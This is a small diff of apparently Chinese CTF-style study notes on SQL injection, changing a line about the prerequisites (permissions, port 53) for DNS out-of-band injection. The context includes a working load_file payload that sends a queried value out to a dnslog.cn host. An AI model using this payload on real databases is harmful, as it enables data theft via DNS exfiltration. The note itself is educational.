@@ -10,4 +10,4 @@ select * from user where id='参数';
 带外注入
 dns带外注入:
 select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog.cn\\a'));
-需要权限和端口都开启
+需要权限和53端口开启
